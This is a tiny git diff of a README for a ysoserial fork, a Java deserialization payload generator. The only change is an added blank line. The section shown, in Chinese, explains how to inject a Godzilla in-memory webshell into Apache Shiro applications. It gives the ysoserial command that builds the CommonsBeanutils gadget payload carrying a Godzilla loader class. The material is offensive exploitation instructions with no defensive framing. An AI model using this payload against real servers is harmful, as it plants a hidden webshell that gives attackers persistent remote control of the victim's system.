@@ -22,6 +22,7 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 ### shiro 内存马注入
 生成哥斯拉反序列化Loader数据，配合poc中 GodzillaPostData.txt 中的 post 内容即可完成哥斯拉内存马注入
+
 `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./poc/shell/GodzillaLoader.class > godzilla.ser`
 
 
